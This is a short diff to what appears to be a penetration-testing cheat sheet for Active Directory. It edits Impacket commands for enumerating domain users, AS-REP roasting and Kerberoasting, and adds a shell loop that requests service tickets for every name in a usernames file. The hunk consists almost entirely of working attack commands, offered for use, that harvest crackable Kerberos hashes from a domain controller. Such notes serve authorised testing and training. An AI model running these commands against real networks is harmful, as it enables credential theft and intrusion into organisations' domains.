@@ -305,9 +305,9 @@ ST='cifs/$DC'; F=$(impacket-getST $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -s
 
 impacket-GetADUsers $DOM/ -dc-host $DC -k -no-pass
 impacket-GetNPUsers $DOM/ -dc-ip "$TARGET" -usersfile usernames
-impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip "$TARGET" -request-user '$USERNAME'
-impacket-GetUserSPNs $DOM/ -dc-host "$TARGET" -usersfile usernames -no-preauth '$USERNAME'
-impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip "$TARGET" -request
+while IFS= read -r user; do echo "\n*-------------------*\n$user"; impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -request-user '$user' -k -no-pass; done < usernames
+impacket-GetUserSPNs $DOM/ -dc-ip $TARGET -usersfile usernames -k -no-pass
+impacket-GetUserSPNs $DOM/'$USERNAME':'$PASSWORD' -dc-ip $TARGET -request
 
 
 [*] RDP
